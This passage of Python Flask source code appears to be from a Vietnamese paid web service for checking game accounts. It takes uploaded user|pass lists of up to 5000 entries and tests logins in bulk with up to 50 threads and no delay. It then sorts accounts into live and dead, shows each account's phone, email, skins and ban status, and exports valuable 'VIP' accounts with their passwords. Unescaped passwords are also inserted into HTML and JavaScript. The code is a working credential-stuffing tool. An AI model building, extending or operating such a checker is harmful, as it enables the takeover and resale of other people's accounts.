    user["mission"]["sss"] = user["mission"].get("sss", 0) + sss_c
    user["mission"]["ss"] = user["mission"].get("ss", 0) + ss_c
    user["mission"]["anime"] = user["mission"].get("anime", 0) + an_c
    add_exp(user, len(results))
    # 🆕 v7.0: Quest + Badge
    quest_add_progress(user, "check_count", len(results))
    check_badge_conditions(user)
    if job.get("cancelled"):
        not_checked = total - len(results)
        refund = (not_checked + 44) // 45
        if refund > 0: user["balance"] += refund; job["refunded"] = refund
    if user.get("current_job") == job_id: user["current_job"] = None
    save_data(force=True); save_jobs(force=True)
    job["done"] = True
    job["stats"] = {"total": len(results), "sss": sss_c, "ss": ss_c, "anime": an_c,
                    "banned": ban_c, "normal": norm_c, "trang": trang_c, "failed": fail_c}
    job["progress"] = 100
    job["summary"] = (f"◈ HOÀN TẤT!\n├─ Đã check: {len(results)}/{total}\n├─ SSS: {sss_c}\n├─ SS: {ss_c}\n├─ Anime: {an_c}\n"
                      f"├─ Trắng: {trang_c + norm_c}\n├─ Ban: {ban_c}\n└─ Trượt: {fail_c}")
    def cleanup(): time.sleep(600); CHECK_JOBS.pop(job_id, None)
    threading.Thread(target=cleanup, daemon=True).start()



# ═══════════════════════════════════════════════════════════════
# 🆕 LỌC LOGIN — Check acc sống/chết, không cần skin
# ═══════════════════════════════════════════════════════════════
@app.route("/loc_login", methods=["GET", "POST"])
@login_required
def loc_login():
    user = get_user()
    if request.method == "POST":
        if "file" not in request.files:
            flash("Chưa chọn file!", "error"); return redirect(url_for("loc_login"))
        f = request.files["file"]
        if not f.filename.endswith(".txt"):
            flash("Chỉ nhận .txt!", "error"); return redirect(url_for("loc_login"))
        try:
            threads = int(request.form.get("threads", 10))
            threads = max(1, min(50, threads))
        except: threads = 10
        try:
            delay = float(request.form.get("delay", 0))
            delay = max(0, min(5, delay))
        except: delay = 0
        
        content_bytes = f.read().decode("utf-8", errors="ignore")
        accs = parse_file_content_advanced(content_bytes, "auto")
        if not accs:
            flash("Không tìm thấy acc!", "error"); return redirect(url_for("loc_login"))
        if len(accs) > 5000:
            flash(f"File quá lớn ({len(accs)}). Tối đa 5000!", "error")
            return redirect(url_for("loc_login"))
        
        total = len(accs)
        logger.info(f"[LOC_LOGIN] {user['username']} | {total} acc | threads={threads} | delay={delay}")
        
        # Chạy check
        start = time.time()
        result = run_login_only_batch(accs, threads=threads, delay=delay)
        elapsed = round(time.time() - start, 1)
        
        # Lưu session để tải file
        session["loc_login_data"] = {
            "live": result["live"],
            "die": result["die"],
            "errors": result["errors"],
            "total": total,
            "elapsed": elapsed,
        }
        session.permanent = True
        
        content = f'''<div class="card" style="border:2px solid #00ff88;">
            <h2 class="card-title" style="color:#00ff88; justify-content:center;">✓ LỌC XONG!</h2>
            <div class="stat-grid-3">
                <div class="stat-box"><div class="stat-value" style="color:#00ff88;">{len(result["live"])}</div><div class="stat-label">✅ LIVE</div></div>
                <div class="stat-box"><div class="stat-value" style="color:#ff2951;">{len(result["die"])}</div><div class="stat-label">❌ DIE</div></div>
                <div class="stat-box"><div class="stat-value" style="color:#ffb800;">{len(result["errors"])}</div><div class="stat-label">⚠️ ERROR</div></div>
            </div>
            <div style="text-align:center; color:var(--text-dim); margin-top:12px; font-size:0.85em;">
                📊 Tổng: {total} acc · ⏱️ {elapsed}s · ⚡ {round(total/elapsed if elapsed > 0 else 0, 1)} acc/s
            </div>
        </div>
        <div class="card">
            <h2 class="card-title">📥 TẢI FILE KẾT QUẢ</h2>
            <div style="display:flex; flex-direction:column; gap:10px;">
                <a href="/loc_login/download?type=live" class="btn btn-block" style="background:linear-gradient(135deg,#00ff88,#00d4aa); color:#000;">✅ Tải LIVE ({len(result["live"])} acc)</a>
                <a href="/loc_login/download?type=die" class="btn btn-block" style="background:linear-gradient(135deg,#ff2951,#d50000); color:#fff;">❌ Tải DIE ({len(result["die"])} acc)</a>
                <a href="/loc_login/download?type=error" class="btn btn-block" style="background:linear-gradient(135deg,#ffb800,#ff8800); color:#000;">⚠️ Tải ERROR ({len(result["errors"])} acc)</a>
                <a href="/loc_login/download?type=all" class="btn btn-block btn-secondary">📦 Tải TẤT CẢ (kèm lý do)</a>
            </div>
        </div>
        <div class="card">
            <h2 class="card-title">👁️ XEM TRƯỚC</h2>
            <div class="tab-bar">
                <a href="#live" class="tab-item active" onclick="showTab('live'); return false;">✅ LIVE ({len(result["live"])})</a>
                <a href="#die" class="tab-item" onclick="showTab('die'); return false;">❌ DIE ({len(result["die"])})</a>
                <a href="#error" class="tab-item" onclick="showTab('error'); return false;">⚠️ ERROR ({len(result["errors"])})</a>
            </div>
            <div id="tab-live" class="tab-content">'''
        # Live table
        if result["live"]:
            content += '<div class="live-log">'
            for i, it in enumerate(result["live"][:200], 1):
                content += f'<div class="log-line sss">✅ [{i}] {it["user"]}|{it["pass"]} — UID: {it["uid"]}</div>'
            content += '</div>'
        else:
            content += '<p style="text-align:center; padding:20px;">Không có acc LIVE</p>'
        content += '''</div>
            <div id="tab-die" class="tab-content" style="display:none;">'''
        if result["die"]:
            content += '<div class="live-log">'
            for i, it in enumerate(result["die"][:200], 1):
                content += f'<div class="log-line banned">❌ [{i}] {it["user"]}|{it["pass"]} — {it["reason"]}</div>'
            content += '</div>'
        else:
            content += '<p style="text-align:center; padding:20px;">Không có acc DIE</p>'
        content += '''</div>
            <div id="tab-error" class="tab-content" style="display:none;">'''
        if result["errors"]:
            content += '<div class="live-log">'
            for i, it in enumerate(result["errors"][:200], 1):
                content += f'<div class="log-line">⚠️ [{i}] {it["user"]}|{it["pass"]} — {it["reason"]}</div>'
            content += '</div>'
        else:
            content += '<p style="text-align:center; padding:20px;">Không có acc ERROR</p>'
        content += '''</div>
        </div>
        <div class="card" style="text-align:center;">
            <a href="/loc_login" class="btn btn-secondary btn-block">← Lọc File Khác</a>
        </div>
        <script>
        function showTab(id) {
            document.querySelectorAll(".tab-content").forEach(el => el.style.display = "none");
            document.getElementById("tab-" + id).style.display = "block";
            document.querySelectorAll(".tab-bar .tab-item").forEach(el => el.classList.remove("active"));
            event.currentTarget.classList.add("active");
        }
        </script>'''
        return render_page(content, active_tab="loc_login", user=user)
    
    # GET — hiện form
    content = '''<div class="card">
        <h2 class="card-title">🔍 LỌC LOGIN — Check Sống/Chết</h2>
        <p style="color:var(--text-dim); margin-bottom:14px; font-size:0.9em;">
            Upload file .txt → Check acc <b>sống hay chết</b> — <span class="filter-badge">⚡ NHANH 10-20x</span>
        </p>
        <div style="background:rgba(0,255,136,0.08); padding:12px; border-radius:12px; margin-bottom:14px; border:1px solid rgba(0,255,136,0.3); font-size:0.85em;">
            <b>💡 Khác gì với Check File?</b><br>
            • <b>Lọc Login</b>: Chỉ check login → <b>nhanh 10-20x</b>, chỉ biết acc sống/chết<br>
            • <b>Check File</b>: Full info (skin, rank, ban...) → chậm hơn
        </div>
        <form method="POST" enctype="multipart/form-data">
            <div class="form-group"><label class="form-label">📎 File danh sách (.txt)</label>
                <input type="file" name="file" class="form-input" accept=".txt" required></div>
            <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-bottom:16px;">
                <div>
                    <label class="form-label">⚡ Số luồng</label>
                    <select name="threads" class="form-input">
                        <option value="5">5 luồng (An toàn)</option>
                        <option value="10" selected>10 luồng (Chuẩn)</option>
                        <option value="20">20 luồng (Nhanh)</option>
                        <option value="30">30 luồng (Siêu nhanh)</option>
                        <option value="50">50 luồng (Tối đa)</option>
                    </select>
                </div>
                <div>
                    <label class="form-label">⏳ Delay</label>
                    <select name="delay" class="form-input">
                        <option value="0" selected>0s (Nhanh nhất)</option>
                        <option value="0.1">0.1s</option>
                        <option value="0.3">0.3s</option>
                        <option value="0.5">0.5s</option>
                    </select>
                </div>
            </div>
            <button type="submit" class="btn btn-block" style="background:linear-gradient(135deg,#00ff88,#00d4aa); color:#000;">
                🚀 BẮT ĐẦU LỌC
            </button>
        </form>
    </div>'''
    return render_page(content, active_tab="loc_login", user=user)


@app.route("/loc_login/download")
@login_required
def loc_login_download():
    data = session.get("loc_login_data", {})
    if not data:
        flash("Chưa có dữ liệu!", "error"); return redirect(url_for("loc_login"))
    t = request.args.get("type", "live")
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    if t == "live":
        items = data.get("live", [])
        lines = [f"{it['user']}|{it['pass']}" for it in items]
        fname = f"LIVE_{len(items)}_{ts}.txt"
    elif t == "die":
        items = data.get("die", [])
        lines = [f"{it['user']}|{it['pass']}" for it in items]
        fname = f"DIE_{len(items)}_{ts}.txt"
    elif t == "error":
        items = data.get("errors", [])
        lines = [f"{it['user']}|{it['pass']}" for it in items]
        fname = f"ERROR_{len(items)}_{ts}.txt"
    else:  # all — kèm lý do
        lines = ["# TẤT CẢ KẾT QUẢ", f"# Tổng: {data.get('total', 0)}", ""]
        for label, key in [("✅ LIVE", "live"), ("❌ DIE", "die"), ("⚠️ ERROR", "errors")]:
            items = data.get(key, [])
            lines.append(f"\n# ===== {label} ({len(items)}) =====")
            for it in items:
                lines.append(f"{it['user']}|{it['pass']}    # {it.get('reason', '')}")
        fname = f"ALL_{data.get('total', 0)}_{ts}.txt"
    
    return Response("\n".join(lines).encode("utf-8"), mimetype="text/plain",
                    headers={"Content-Disposition": f"attachment; filename={fname}"})

# ========== LỌC FILE ==========
@app.route("/loc_file")
@login_required
def loc_file():
    user = get_user()
    content = '''<div class="card"><h2 class="card-title">📥 Lọc File Acc</h2>
        <p style="color:var(--text-dim); margin-bottom:14px; font-size:0.9em;">Upload file .txt bất kỳ — <span class="filter-badge">🤖 LỌC 25+ ĐỊNH DẠNG</span></p>
        <form method="POST" action="/loc_file/process" enctype="multipart/form-data">
            <div class="form-group"><label class="form-label">File danh sách (.txt)</label>
                <input type="file" name="file" class="form-input" accept=".txt" required></div>
            <button type="submit" class="btn btn-block">📥 Lọc File Này</button></form></div>'''
    return render_page(content, active_tab="loc_file", user=user)

@app.route("/loc_file/process", methods=["POST"])
@login_required
def loc_file_process():
    user = get_user()
    if "file" not in request.files: flash("Chưa chọn file!", "error"); return redirect(url_for("loc_file"))
    f = request.files["file"]
    if not f.filename.endswith(".txt"): flash("Chỉ nhận .txt!", "error"); return redirect(url_for("loc_file"))
    content_bytes = f.read().decode("utf-8", errors="ignore")
    accs = parse_file_content_advanced(content_bytes, "auto")
    if not accs: flash("Không tìm thấy acc!", "error"); return redirect(url_for("loc_file"))
    total = len(accs); session["loc_accs"] = accs[:1000]; session.permanent = True
    rows = ""
    for i, (u, p) in enumerate(accs[:200], 1):
        rows += f'<div class="list-item"><div style="flex:1; min-width:0;"><div style="font-family:monospace; font-weight:600;">{i}. <b style="color:#00f2fe;">{u}</b> : <b style="color:#ff88ee;">{p}</b></div></div></div>'
    content = f'''<div class="card"><h2 class="card-title" style="color:#00ff88;">✓ Lọc thành công!</h2>
        <div class="stat-grid"><div class="stat-box"><div class="stat-value">{total}</div><div class="stat-label">Acc hợp lệ</div></div></div></div>
    <div class="card"><h2 class="card-title">📥 Tải File Đã Lọc</h2>
        <div style="display:flex; flex-direction:column; gap:10px;">
            <a href="/loc_file/download?fmt=pipe" class="btn btn-block" style="background:linear-gradient(135deg,#00ff88,#00d4aa); color:#000;">📥 user|pass</a>
            <a href="/loc_file/download?fmt=stt" class="btn btn-block" style="background:linear-gradient(135deg,#00f2fe,#00a5ff); color:#000;">📥 1|user|pass</a>
            <a href="/loc_file/download?fmt=colon" class="btn btn-block" style="background:linear-gradient(135deg,#ffb800,#ff8800); color:#000;">📥 user:pass</a>
        </div></div>
    <div class="card"><h2 class="card-title">📋 Danh Sách ({total})</h2>{rows}</div>
    <a href="/loc_file" class="btn btn-secondary btn-block">← Lọc File Khác</a>'''
    return render_page(content, active_tab="loc_file", user=user)

@app.route("/loc_file/download")
@login_required
def loc_file_download():
    fmt = request.args.get("fmt", "pipe"); accs = session.get("loc_accs", [])
    if not accs: flash("Không có dữ liệu!", "error"); return redirect(url_for("loc_file"))
    lines = []
    if fmt == "stt":
        for i, (u, p) in enumerate(accs, 1): lines.append(f"{i}|{u}|{p}")
        fname = "loc_acc_stt.txt"
    elif fmt == "colon":
        for u, p in accs: lines.append(f"{u}:{p}")
        fname = "loc_acc_colon.txt"
    else:
        for u, p in accs: lines.append(f"{u}|{p}")
        fname = "loc_acc_pipe.txt"
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    return Response("\n".join(lines).encode("utf-8"), mimetype="text/plain",
                    headers={"Content-Disposition": f"attachment; filename={fname.replace('.txt','')}_{ts}.txt"})

@app.route("/export_tool")
@login_required
def export_tool():
    user = get_user()
    content = '''<div class="card"><h2 class="card-title">📄 Tạo File Danh Sách</h2>
        <form method="POST" action="/export_tool/download">
        <div class="form-group"><label class="form-label">Danh sách acc</label>
            <textarea name="accs" class="form-textarea" rows="15" required style="min-height:300px;" placeholder="user1|pass1&#10;user2:pass2"></textarea></div>
        <div class="form-group"><label class="form-label">Tên file</label>
            <input type="text" name="filename" class="form-input" value="danh_sach_acc"></div>
        <button type="submit" class="btn btn-block">📥 Xuất File .txt</button></form></div>'''
    return render_page(content, active_tab="export", user=user)

@app.route("/export_tool/download", methods=["POST"])
@login_required
def export_tool_download():
    raw = request.form.get("accs", "").strip()
    filename = request.form.get("filename", "danh_sach_acc").strip()
    safe = "".join(c for c in filename if c.isalnum() or c in "_-") or "danh_sach_acc"
    if not raw: flash("Chưa nhập!", "error"); return redirect(url_for("export_tool"))
    accs = parse_file_content_advanced(raw, "auto")
    if not accs: flash("Không có acc hợp lệ!", "error"); return redirect(url_for("export_tool"))
    return Response("\n".join([f"{u}|{p}" for u, p in accs]).encode("utf-8"), mimetype="text/plain",
                    headers={"Content-Disposition": f"attachment; filename={safe}.txt"})

# ========== LỊCH SỬ ==========
@app.route("/history")
@login_required
def history():
    user = get_user()
    tab = request.args.get("tab", "all")
    hist = user.get("history", [])[::-1]
    filters = {"sss": lambda h: h.get("result") == "sss", "ss": lambda h: h.get("result") == "ss",
               "anime": lambda h: h.get("result") == "anime", "trang": lambda h: h.get("result") == "trang",
               "vip": lambda h: h.get("result") in ("sss","ss","anime")}
    filtered = [h for h in hist if filters.get(tab, lambda h: True)(h)] if tab in filters else hist
    counts = {"all": len(hist),
        "sss": sum(1 for h in hist if h.get("result") == "sss"),
        "ss": sum(1 for h in hist if h.get("result") == "ss"),
        "anime": sum(1 for h in hist if h.get("result") == "anime"),
        "trang": sum(1 for h in hist if h.get("result") == "trang")}
    counts["vip"] = counts["sss"] + counts["ss"] + counts["anime"]
    export_btn = ""
    if tab == "vip": export_btn = f'<a href="/export_vip_all" class="btn btn-success btn-block" style="margin-bottom:14px;">📥 XUẤT VIP ALL - {counts["vip"]} acc</a>'
    elif tab in ("sss","ss","anime","trang"): export_btn = f'<a href="/export_results?type={tab}" class="btn btn-success btn-block" style="margin-bottom:14px;">📥 Xuất File {tab.upper()}</a>'
    elif tab == "all": export_btn = '<a href="/export_vip_all" class="btn btn-success btn-block" style="margin-bottom:14px;">📥 Xuất Tất Cả VIP</a>'
    rows = ""
    if filtered:
        for h in filtered[:200]:
            color = {"sss": "#ffb800", "ss": "#00f2fe", "anime": "#e040fb", "normal": "#8b8b9a",
                     "trang": "#a0a0b8", "banned": "#ff2951", "failed": "#5a5a6e"}.get(h.get("result", ""), "#8b8b9a")
            hid = h.get("id", "")
            kho_badge = '<span class="kho-badge">🎁 KHO</span>' if h.get("from_kho") else ""
            u_esc = (h.get("acc") or "").replace("'", "\\'")
            p_esc = (h.get("password") or "").replace("'", "\\'")
            copy_btn = f'<button class="btn btn-sm btn-success" onclick="copyBoth(\'{u_esc}\',\'{p_esc}\')">📋</button>'
            rows += f'''<div class="list-item">
                <div style="flex:1; min-width:0;"><div style="font-family:monospace; font-weight:600; overflow:hidden; text-overflow:ellipsis;">{h['acc']}{kho_badge}</div>
                <div style="font-size:0.72em; color:var(--text-mute);">{h['time']} · {h.get("total_skins", 0)} skin</div></div>
                <div style="padding:4px 12px; background:{color}20; color:{color}; border-radius:8px; font-size:0.72em; font-weight:800; text-transform:uppercase;">{h['result']}</div>
                {copy_btn}<a href="/history/{hid}" class="btn btn-sm btn-info">👁</a></div>'''
    else: rows = '<p style="text-align:center; color:var(--text-dim); padding:20px;">Chưa có dữ liệu</p>'
    content = f'''<div class="card"><h2 class="card-title">▤ Lịch Sử Check</h2></div>
    <div class="tab-bar">
        <a href="/history?tab=all" class="tab-item {'active' if tab == 'all' else ''}">▤ Tất Cả ({counts['all']})</a>
        <a href="/history?tab=vip" class="tab-item {'active' if tab == 'vip' else ''}">★ VIP ({counts['vip']})</a>
        <a href="/history?tab=sss" class="tab-item sss-tab {'active' if tab == 'sss' else ''}">◈ SSS ({counts['sss']})</a>
        <a href="/history?tab=ss" class="tab-item ss-tab {'active' if tab == 'ss' else ''}">◆ SS ({counts['ss']})</a>
        <a href="/history?tab=anime" class="tab-item anime-tab {'active' if tab == 'anime' else ''}">◇ Anime ({counts['anime']})</a>
        <a href="/history?tab=trang" class="tab-item trang-tab {'active' if tab == 'trang' else ''}">○ Trắng ({counts['trang']})</a>
    </div>
    {export_btn}<div class="card">{rows}</div>
    <script>
    function copyBoth(u, p) {{ var text = "User: " + u + "\\nPass: " + p;
        if (navigator.clipboard) {{ navigator.clipboard.writeText(text).then(function() {{ showToast("✓ Đã copy!"); }}); }} }}
    </script>'''
    return render_page(content, active_tab="history", user=user)

@app.route("/history/<hid>")
@login_required
def history_detail(hid):
    user = get_user(); entry = None
    for h in user.get("history", []):
        if h.get("id") == hid: entry = h; break
    if not entry: flash("Không tìm thấy!", "error"); return redirect(url_for("history"))
    if request.args.get("del") == "1":
        user["history"] = [x for x in user["history"] if x.get("id") != hid]
        save_data(force=True); flash("Đã xóa!", "success")
        return redirect(url_for("history"))
    t_ = entry.get("result", "unknown")
    tier_colors = {"sss": ("#ffb800","◈","SSS"), "ss": ("#00f2fe","◆","SS"),
                   "anime": ("#e040fb","◇","ANIME"), "normal": ("#8b8b9a","▪","THƯỜNG"),
                   "trang": ("#a0a0b8","○","TRẮNG"), "banned": ("#ff2951","✖","BANNED"),
                   "failed": ("#5a5a6e","✕","LỖI")}
    color, icon, tier_label = tier_colors.get(t_, ("#8b8b9a","?",t_.upper()))
    cred_box = f'''<div class="cred-box"><div class="cred-label">◈ Tài khoản</div>
        <div class="cred-value" onclick="copyText(this)">{entry.get('acc','')}</div>
        <div class="cred-label">◈ Mật khẩu</div>
        <div class="cred-value" onclick="copyText(this)">{entry.get('password','')}</div>
        <button class="btn btn-success btn-block" onclick="copyBoth('{entry.get('acc','')}','{entry.get('password','')}')" style="margin-top:8px;">📋 Copy TK + MK</button></div>'''
    def render_skin_grid(lst, cls, ico, label):
        if not lst: return ""
        items_html = ""
        for s in lst:
            items_html += f'''<div class="skin-card"><div class="skin-img-wrap"><img src="{s.get('cdn','')}" loading="lazy" onerror="this.onerror=null;this.src='{s.get('cdn_fallback','')}';"></div>
                <div class="skin-info"><div class="skin-hero">{s.get('hero','?')}</div><div class="skin-name">{s.get('skin','?')}</div>
                    </div></div>'''
        return f'<div class="card"><h3 class="card-title" style="font-size:0.95em;">{ico} {label} ({len(lst)})</h3><div class="skin-grid">{items_html}</div></div>'
    sss_html = render_skin_grid(entry.get("skins_sss", []), "sss", "⭐", "SSS")
    anime_html = render_skin_grid(entry.get("skins_anime", []), "anime", "🎴", "ANIME")
    ss_html = render_skin_grid(entry.get("skins_ss", []), "ss", "💠", "SS")
    kho_banner = '<div class="kho-badge" style="font-size:0.85em; padding:6px 14px; margin-bottom:10px;">🎁 NHẬN TỪ KHO ACC</div>' if entry.get("from_kho") else ""
    ban_banner = ""
    if entry.get("banned"):
        ban_end = entry.get("ban_end_time", ""); ban_reason = entry.get("ban_reason", "")
        ban_sources = entry.get("ban_sources", [])
        ban_banner = f'''<div class="card" style="border:2px solid #ff2951; background:rgba(255,41,81,0.1);">
            <h3 class="card-title" style="color:#ff2951; font-size:1em;">🚫 ACC ĐANG BỊ BAN</h3>
            <div class="info-row"><span class="info-label">Hết hạn</span><span class="info-value">{ban_end or "Vĩnh viễn"}</span></div>
            {f'<div class="info-row"><span class="info-label">Lý do</span><span class="info-value">{ban_reason}</span></div>' if ban_reason else ''}
            {f'<div class="info-row"><span class="info-label">Nguồn</span><span class="info-value">{", ".join(ban_sources)}</span></div>' if ban_sources else ''}</div>'''
    banner = f'''<div class="card" style="text-align:center; border:2px solid {color};">
        {kho_banner}<div style="font-size:4em; color:{color};">{icon}</div>
        <div style="font-family:Orbitron; font-size:1.8em; font-weight:900; color:{color};">{tier_label}</div>
        <div style="font-size:0.75em; color:var(--text-mute); margin-top:8px;">{entry["time"]}</div></div>'''
    banned_text = f'<span style="color:#ff2951; font-weight:700;">🔴 BANNED</span>' if entry.get("banned") else '<span style="color:#00ff88; font-weight:700;">🟢 CLEAN</span>'
    phone_disp = entry.get("mobile_no") or "Không có"
    if entry.get("mobile_no") and entry.get("country_code"): phone_disp = f"{entry['mobile_no']} (+{entry['country_code']})"
    info_card = f'''<div class="card"><h3 class="card-title">◐ Thông Tin</h3>
        <div class="info-row"><span class="info-label">UID</span><span class="info-value">{entry.get("uid") or "N/A"}</span></div>
        <div class="info-row"><span class="info-label">Player UID</span><span class="info-value">{entry.get("player_uid") or "N/A"}</span></div>
        <div class="info-row"><span class="info-label">Nickname</span><span class="info-value">{entry.get("nickname") or entry.get("nick") or "Chưa đặt"}</span></div>
        <div class="info-row"><span class="info-label">SĐT</span><span class="info-value">{phone_disp}</span></div>
        <div class="info-row"><span class="info-label">Email</span><span class="info-value">{entry.get("email") or "Không có"}</span></div>
        <div class="info-row"><span class="info-label">Rank</span><span class="info-value">{entry.get("rank") or "Chưa xếp hạng"} ({entry.get("rank_stars",0)}★)</span></div>
        <div class="info-row"><span class="info-label">Level</span><span class="info-value">{entry.get("level", 0)}</span></div>
        <div class="info-row"><span class="info-label">Trạng thái</span><span class="info-value">{banned_text}</span></div>
        <div class="info-row"><span class="info-label">Tổng Skin</span><span class="info-value">{entry.get("total_skins",0)}</span></div></div>'''
    content = f'''
    <div style="margin-bottom:14px; display:flex; gap:8px;">
        <a href="/history" class="btn btn-secondary btn-sm">← Quay Lại</a>
        <a href="/history/{hid}?del=1" class="btn btn-danger btn-sm" onclick="return confirm('Xóa?');">🗑️ Xóa</a></div>
    {banner}{ban_banner}{cred_box}{info_card}{sss_html}{anime_html}{ss_html}
    <script>
    function copyBoth(u, p) {{ var text = "User: " + u + "\\nPass: " + p;
        if (navigator.clipboard) {{ navigator.clipboard.writeText(text).then(function() {{ showToast("✓ Đã copy!"); }}); }} }}
    </script>'''
    return render_page(content, active_tab="history", user=user)

def build_export_lines(items, header_title, user):
    lines = ["#" + "="*60, f"# {header_title}", "#" + "="*60,
             f"# Người xuất: {user['username']}",
             f"# Thời gian: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
             f"# Tổng: {len(items)} acc", "#" + "="*60 + "\n"]
    for idx, h in enumerate(sorted(items, key=lambda x: x.get("time",""), reverse=True), 1):
        tier = h.get("result","").upper()
        sss_c = len(h.get("skins_sss", [])); ss_c = len(h.get("skins_ss", []))
        anime_c = len(h.get("skins_anime", [])); other_c = len(h.get("skins_other", []))
        total = sss_c + ss_c + anime_c + other_c
        lines += ["#" + "─"*60, f"# [{idx}] ACC {tier}",
            f"# UID: {h.get('uid','N/A')} | Nick: {h.get('nick','N/A') or 'Chưa đặt'}",
            f"# Rank: {h.get('rank','N/A')} ({h.get('rank_stars',0)}★) | Level: {h.get('level',0)}",
            f"# Tổng Skin: {total}", f"# Acc: {h.get('acc','')}|{h.get('password','')}"]
        if sss_c:
            lines.append(f"# ⭐ SSS ({sss_c}):")
            for s in h.get("skins_sss", []): lines.append(f"#   ⭐ {s.get('hero','?')} → {s.get('skin','?')}")
        if anime_c:
            lines.append(f"# 🎴 Anime ({anime_c}):")
            for s in h.get("skins_anime", []): lines.append(f"#   🎴 {s.get('hero','?')} → {s.get('skin','?')}")
        if ss_c:
            lines.append(f"# 💎 SS ({ss_c}):")
            for s in h.get("skins_ss", []): lines.append(f"#   💎 {s.get('hero','?')} → {s.get('skin','?')}")
        lines += ["", f"{h.get('acc','')}|{h.get('password','')}", ""]
    return "\n".join(lines)

@app.route("/export_vip_all")
@login_required
def export_vip_all():
    user = get_user(); hist = user.get("history", [])
    all_vip = [h for h in hist if h.get("result") in ("sss","ss","anime")]
    if not all_vip: flash("Chưa có acc VIP!", "error"); return redirect(url_for("history"))
    file_content = build_export_lines(all_vip, "DANH SÁCH ACC VIP", user)
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    return Response(file_content.encode("utf-8"), mimetype="text/plain",
                    headers={"Content-Disposition": f"attachment; filename=acc_VIP_ALL_{ts}.txt"})

@app.route("/export_results")
@login_required
def export_results():
    user = get_user(); t_ = request.args.get("type", "sss"); hist = user.get("history", [])
    items = [h for h in hist if h.get("result") == t_]
    if not items: flash(f"Chưa có acc {t_.upper()}!", "error"); return redirect(url_for("history"))
    file_content = build_export_lines(items, f"DANH SÁCH ACC {t_.upper()}", user)
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    return Response(file_content.encode("utf-8"), mimetype="text/plain",
                    headers={"Content-Disposition": f"attachment; filename=acc_{t_.upper()}_{ts}.txt"})
# ═══════════════════════════════════════════════════════════════════
#  🎮 GAME ROUTES
# ═══════════════════════════════════════════════════════════════════
@app.route("/game")
@login_required
def game_hub():
    user = get_user()
    _reset_game_daily_if_needed(user)
    gd = user.get("game_daily", {})
    game_cards = ""
    for gid, cfg in GAME_CONFIGS.items():
        played = gd.get(gid, 0)
        game_cards += f'''<a href="/game/{gid}" class="list-item" style="text-decoration:none; flex-wrap:wrap;">
            <div style="font-size:2.2em; min-width:50px; text-align:center;">{cfg["icon"]}</div>
            <div style="flex:1; min-width:150px;">
                <div style="font-family:var(--font-display); font-weight:800; font-size:1.05em; color:{cfg['color']};">{t(cfg['name_key'])}</div>
                <div style="font-size:0.75em; color:var(--text-dim); margin-top:2px;">{t(cfg['desc_key'])}</div>
                <div style="font-size:0.72em; color:var(--text-mute); margin-top:4px;">🎯 {t('game_plays_today')}: <b style="color:{cfg['color']};">{played}/{cfg['max_daily']}</b></div>
            </div>
            <div style="padding:6px 12px; background:{cfg['color']}20; color:{cfg['color']}; border-radius:10px; font-weight:800; font-family:var(--font-display); font-size:0.8em;">{t('game_play')}</div>
        </a>'''
    stats = user.get("game_stats", {})
    history_rows = ""
    for h in user.get("game_history", [])[-15:][::-1]:
        gid = h.get("game", ""); gcfg = GAME_CONFIGS.get(gid, {"icon":"🎮","color":"#8b8b9a","name_key":""})
        delta = h.get("delta", 0)
        delta_color = "#00ff88" if delta > 0 else ("#ff2951" if delta < 0 else "#8b8b9a")
        delta_txt = f"+{delta}" if delta > 0 else str(delta)
        history_rows += f'''<div class="info-row">
            <span class="info-label">{gcfg['icon']} {h.get("time","")[-8:]}</span>
            <span class="info-value" style="color:{delta_color}; font-weight:800;">{delta_txt} xu</span></div>'''
    if not history_rows: history_rows = f'<p style="text-align:center; color:var(--text-dim); padding:14px;">{t("game_no_history")}</p>'
    content = f'''
    <div class="card" style="text-align:center; background:linear-gradient(135deg,rgba(255,183,3,0.15),rgba(255,0,127,0.15)); border:2px solid #ffb800;">
        <div style="font-size:3.5em;">🎮</div>
        <h2 class="card-title" style="justify-content:center; color:#ffb800; font-size:1.4em;">{t("game_hub")}</h2>
        <div style="font-family:var(--font-display); color:#ffd700; font-weight:800; font-size:1.1em; margin-top:8px;">💰 {t("game_balance")}: {user.get("balance", 0)} xu</div>
    </div>
    <div class="card">
        <h2 class="card-title">🎯 Danh sách game</h2>
        <div style="display:flex; flex-direction:column; gap:10px;">{game_cards}</div>
    </div>
    <div class="card">
        <h2 class="card-title">📊 Thống kê cá nhân</h2>
        <div class="stat-grid-3">
            <div class="stat-box"><div class="stat-value" style="color:#00ff88;">{stats.get("total_win",0)}</div><div class="stat-label">{t("game_win")}</div></div>
            <div class="stat-box"><div class="stat-value" style="color:#ff2951;">{stats.get("total_lose",0)}</div><div class="stat-label">{t("game_lose")}</div></div>
            <div class="stat-box"><div class="stat-value" style="color:#ffd700;">{stats.get("biggest_win",0)}</div><div class="stat-label">Big win</div></div>
        </div>
    </div>
    <div class="card">
        <h2 class="card-title">📜 {t("game_history")}</h2>
        {history_rows}
    </div>
    <div class="card" style="text-align:center;">
        <a href="/game/bxh" class="btn btn-block" style="background:linear-gradient(135deg,#ffb800,#ff8800); color:#000;">🏆 {t("bxh_title")}</a>
    </div>'''
    return render_page(content, active_tab="game", user=user)

@app.route("/game/bxh")
@login_required
def game_bxh():
    user = get_user()
    rankings = []
    for un, u in USERS.items():
        stats = u.get("game_stats", {})
        if stats.get("total_play", 0) > 0:
            rankings.append({"username": un, "biggest_win": stats.get("biggest_win", 0),
                              "total_won": stats.get("total_won_xu", 0),
                              "plays": stats.get("total_play", 0)})
    rankings.sort(key=lambda x: (x["biggest_win"], x["total_won"]), reverse=True)
    rows = ""
    medals = ["🥇","🥈","🥉"]
    for i, r in enumerate(rankings[:50], 1):
        medal = medals[i-1] if i <= 3 else f"#{i}"
        color = "#ffd700" if i == 1 else ("#c0c0c0" if i == 2 else ("#cd7f32" if i == 3 else "#8b8b9a"))
        is_me = r["username"] == user["username"]
        bg = "background:rgba(0,242,254,0.12); border-color:rgba(0,242,254,0.4);" if is_me else ""
        rows += f'''<div class="list-item" style="{bg}">
            <div style="font-size:1.5em; min-width:40px; text-align:center;">{medal}</div>
            <div style="flex:1;">
                <div style="font-weight:800; color:{color}; font-family:var(--font-display);">{r["username"]}{" (bạn)" if is_me else ""}</div>
